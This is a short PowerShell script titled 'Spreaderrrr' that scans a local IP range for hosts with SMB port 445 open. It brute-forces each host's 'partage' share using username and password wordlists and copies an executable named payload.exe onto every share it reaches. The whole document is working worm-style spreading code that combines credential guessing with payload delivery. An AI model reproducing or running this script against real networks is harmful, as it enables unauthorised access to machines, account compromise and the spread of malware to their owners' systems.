####################################################################################
#@author - Jerome Themee
#@version - 1.0
#@date - 12/27/2016
#@title - Spreaderrrr
####################################################################################
#network configuration
$port = 445 
$net = read-host “where we are going ? 192.168.0”
$range = 3..10
$a= Get-Content "C:\Users\thomas\Desktop\test\listeusername.txt"
$b= Get-Content "C:\Users\thomas\Desktop\test\listepassword.txt"
$i=1
foreach ($r in $range)
{
    $ip = “{0}.{1}” -F $net,$r

   "try $ip"

    if(Test-Connection -BufferSize 32 -Count 1 -Quiet -ComputerName $ip){
       
        $socket = new-object System.Net.Sockets.TcpClient($ip, $port)

        if($socket.Connected){
            “$ip is listening to port $port”
    $q=1
            foreach ($c in $a){
                    foreach ($d in $b){
                       
                            $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $c, ($d | ConvertTo-SecureString -AsPlainText -Force)

                            "try $c with $d : $cred"
                            New-PSDrive -Name "w$i" -PSProvider "FileSystem" -Root "\\$ip\partage" -Credential $cred -Description "hack" 
                            Copy-Item "C:\Users\thomas\Desktop\test\dist\payload.exe" -Destination "\\$ip\partage"


                            $q=$q+1
                            $q


                        }
                    }
               $socket.Close()
             }
             $i=$i+1

             }
                 else {
                    “$ip is not listening on $port”
         }
 }